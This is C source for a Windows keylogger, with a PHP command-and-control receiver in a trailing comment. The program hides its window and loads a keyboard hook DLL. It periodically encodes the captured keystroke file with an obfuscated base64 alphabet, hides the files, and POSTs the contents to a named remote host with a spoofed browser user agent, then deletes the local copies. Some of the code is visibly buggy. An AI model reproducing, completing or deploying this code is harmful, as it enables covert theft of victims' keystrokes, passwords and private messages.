#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <stdio.h>

#define ULTIMATE_QUESTION    42
static const char alt64[] = "¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕ0123456789+/";
const char g_szClassName[] = "log keys window";
#define B64_SYNTAX_ERROR        1
#define B64_FILE_ERROR          2
#define B64_FILE_IO_ERROR       3
#define B64_ERROR_OUT_CLOSE     4
#define B64_LINE_SIZE_TO_MIN    5
#define B64_SYNTAX_TOOMANYARGS  6
#define B64_DEF_LINE_SIZE   	72
#define B64_MIN_LINE_SIZE    	4
#define USER_AGENT				"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17"
#define CNC 					"gironsec.com"
#define CNC_FILE				"/totally-legit.php"
#define HOW_OFTEN				30000 // 300 seconds (5 mins)


// function prototypes
void DllStuff(int action);
void SendOff(char*);
char* ReadKeyFile(void);
DWORD GetKeyFileSize(void);
static int encode( FILE *infile, FILE *outfile, int linesize );
static void encodeblock( unsigned char *in, unsigned char *out, int len );

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch(msg)
    {
		case WM_CREATE:
		{
			SetTimer (hwnd, ULTIMATE_QUESTION, HOW_OFTEN, NULL) ; // 300 seconds (5 mins)
			DllStuff(1);
		}
			break;
        case WM_CLOSE:
		{
			DllStuff(2);
            DestroyWindow(hwnd);
		}
			break;
		case WM_TIMER:
        {
			// encode file, then send off data?
    		int linesize = B64_DEF_LINE_SIZE;
			FILE *lolfile, *lolfile2; 
			ITEMIDLIST* pidl;
			char lpPath[MAX_PATH], path2[MAX_PATH], path3[MAX_PATH];
			HRESULT hRes = SHGetSpecialFolderLocation( NULL, CSIDL_PROFILE, &pidl );
			if  SUCCEEDED(hRes) 
			{
			SHGetPathFromIDList( pidl, lpPath );
			sprintf(path2,"%s\\stuff.txt",lpPath);
			sprintf(path3,"%s\\stuffed.txt",lpPath);
			}
			lolfile = fopen(path2,"rb");
			lolfile2 = fopen(path3,"ab"); //  was write bin, set to append bin 
			if(lolfile!=NULL)
			{
				encode( lolfile, lolfile2, linesize ); 
				SetFileAttributes(path2,0x2|0x4);
				SetFileAttributes(path3,0x2|0x4);
			}
			else // file not found? just execute a few bullshit instructions and try again when we get input 5 mins later
			{ 
				__asm
				{
				nop
				RDTSC
				RDTSC
				RDTSC
				RDTSC
				nop
				}////////////////////
			}
			fclose(lolfile);
			fclose(lolfile2); // might as well free some resources
			// after encoding, we can now read the contents of the encoded file and send away.
			SendOff(ReadKeyFile());
			// Now that data has been sent off, we can delete both files so our POST requuests dont get too big
			 DeleteFile(path2);
			 DeleteFile(path3);
		}
			break;
        case WM_DESTROY:
		{
            PostQuitMessage(0);
		}
			break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    WNDCLASSEX wc;
    HWND hwnd;
    MSG Msg;

    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.style         = 0;
    wc.lpfnWndProc   = WndProc;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = hInstance;
    wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszMenuName  = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

    if(!RegisterClassEx(&wc))
    {
        return 0;
    }

    hwnd = CreateWindowEx(WS_EX_CLIENTEDGE,g_szClassName,"Logger Of Keys Window",WS_OVERLAPPEDWINDOW,
	CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, hInstance, NULL);

    if(hwnd == NULL)
    {
        return 0;
    }
    
	ShowWindow(hwnd, SW_HIDE);
    UpdateWindow(hwnd);

    while(GetMessage(&Msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return Msg.wParam;
}
void DllStuff(int action)
{
	HINSTANCE hinst = LoadLibrary("kb_hook.dll");
	
	if (hinst)
	{
	 typedef void (*Install)();
	 typedef void (*Uninstall)();
	 Install install = (Install) GetProcAddress(hinst, "install");
	 
	 Uninstall uninstall = (Uninstall) GetProcAddress(hinst, "uninstall");
	 
	if(action == 1)
	{
		install();
	    MSG msg;
		while(GetMessage(&msg, NULL, 0, 0) > 0)
		{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
		}
	}
	if(action == 2)
	{
		uninstall();
	}
  }
	else
	{
		// dont be noisy, just crash and BURN
		__asm
		{
			mov eax,0x12345678
			jmp eax
		}
	}
}
void __stdcall SendOff(char *greg)
{
	HINTERNET h = InternetOpen(USER_AGENT,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0); // bypass many corporate nets by using https
	h = InternetConnect(h,CNC,INTERNET_DEFAULT_HTTP_PORT,"","",INTERNET_SERVICE_HTTP,0,0);
	h = HttpOpenRequest(h,"POST",CNC_FILE,NULL,NULL,NULL,0,0);
	char joe[GetKeyFileSize()]; 
	sprintf(joe,"globbers=%s",greg);
	HttpSendRequest(h,"Content-Type: application/x-www-form-urlencoded\r\n",49,joe,strlen(joe)); // 49 chars (exclude the \r\n\)
	InternetCloseHandle(h);
	free(joe);
	return;
}
char* ReadKeyFile(void)
{
    char *readbuff;
	FILE *lolfile; 
	ITEMIDLIST* pidl;
	char lpPath[MAX_PATH], path2[MAX_PATH];
	HRESULT hRes = SHGetSpecialFolderLocation( NULL, CSIDL_PROFILE, &pidl );
	if  SUCCEEDED(hRes) 
	{
	SHGetPathFromIDList( pidl, lpPath );
	sprintf(path2,"%s\\stuffed.txt",lpPath);
	}
	lolfile = fopen(path2,"r");
	if(lolfile!=NULL)
	{
	fseek(lolfile,0,SEEK_END);
	long fsize = ftell(lolfile);rewind(lolfile);
	readbuff = (char*) malloc (sizeof(char)*fsize);
	fread (readbuff,1,fsize,lolfile);
	fclose(lolfile);
	return readbuff;
	}
	else
	{
		return "Failed to open file\r\n";
	}
}

DWORD GetKeyFileSize(void)
{
	ITEMIDLIST* pidl;
	char lpPath[MAX_PATH], path2[MAX_PATH];
	HRESULT hRes = SHGetSpecialFolderLocation( NULL, CSIDL_PROFILE, &pidl );
	if  SUCCEEDED(hRes) 
	{
	SHGetPathFromIDList( pidl, lpPath );
	sprintf(path2,"%s\\stuffed.txt",lpPath);
	}
	HANDLE file = CreateFile(path2,GENERIC_READ,1,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD filesize = GetFileSize(file, NULL);
	CloseHandle(file);
	return filesize;
}
static void encodeblock( unsigned char *in, unsigned char *out, int len )
{
    out[0] = (unsigned char) alt64[ (int)(in[0] >> 2) ];
    out[1] = (unsigned char) alt64[ (int)(((in[0] & 0x03) << 4) | ((in[1] & 0xf0) >> 4)) ];
    out[2] = (unsigned char) (len > 1 ? alt64[ (int)(((in[1] & 0x0f) << 2) | ((in[2] & 0xc0) >> 6)) ] : '@');
	// out[2] = (unsigned char) (len > 1 ? alt64[ (int)(((in[1] & 0x0f) << 2) | ((in[2] & 0xc0) >> 6)) ] : '=');
	// out[3] = (unsigned char) (len > 2 ? alt64[ (int)(in[2] & 0x3f) ] : '=');
    out[3] = (unsigned char) (len > 2 ? alt64[ (int)(in[2] & 0x3f) ] : '@');
}
static int encode( FILE *infile, FILE *outfile, int linesize )
{
    unsigned char in[3];
	unsigned char out[4];
    int i, len, blocksout = 0;
    int retcode = 0;
	*in = (unsigned char) 0;
	*out = (unsigned char) 0;
    while( feof( infile ) == 0 ) {
        len = 0;
        for( i = 0; i < 3; i++ ) {
            in[i] = (unsigned char) getc( infile );
            if( feof( infile ) == 0 ) {
                len++;
            }
            else {
                in[i] = (unsigned char) 0;
            }
        }
        if( len > 0 ) {
            encodeblock( in, out, len );
            for( i = 0; i < 4; i++ ) {
                if( putc( (int)(out[i]), outfile ) == 0 ){
					
	                if( ferror( outfile ) != 0 )      {
	                    printf("File IO error!\r\n");
	                    retcode = B64_FILE_IO_ERROR;
	                }
					break;
				}
            }
            blocksout++;
        }
        if( blocksout >= (linesize/4) || feof( infile ) != 0 ) {
            if( blocksout > 0 ) {
                fprintf( outfile, "\r\n" );
            }
            blocksout = 0;
        }
    }
    return( retcode );
}
/* 
 CNC file. Place on php enabled web server. Name to whatever.
<?php
function joe_base64_decode($input) {
//$keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
$keyStr =  "¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕ0123456789+/";
$chr1 = $chr2 = $chr3 = "";
$enc1 = $enc2 = $enc3 = $enc4 = "";
$i = 0;
$output = "";
// remove all characters that are not A-Z, a-z, 0-9, +, /, or =
//$input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
do {
$enc1 = strpos($keyStr, substr($input, $i++, 1));
$enc2 = strpos($keyStr, substr($input, $i++, 1));
$enc3 = strpos($keyStr, substr($input, $i++, 1));
$enc4 = strpos($keyStr, substr($input, $i++, 1));
$chr1 = ($enc1 << 2) | ($enc2 >> 4);
$chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
$chr3 = (($enc3 & 3) << 6) | $enc4;
$output = $output . chr((int) $chr1);
if ($enc3 != 64) {
$output = $output . chr((int) $chr2);
}
if ($enc4 != 64) {
$output = $output . chr((int) $chr3);
}
$chr1 = $chr2 = $chr3 = "";
$enc1 = $enc2 = $enc3 = $enc4 = "";
} while ($i < strlen($input));
return urldecode($output);
}
if($_SERVER['HTTP_USER_AGENT'] == "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17")
{
$data = joe_base64_decode($_POST['globbers']);
file_put_contents($data,"logs.txt");
}
?>
*/
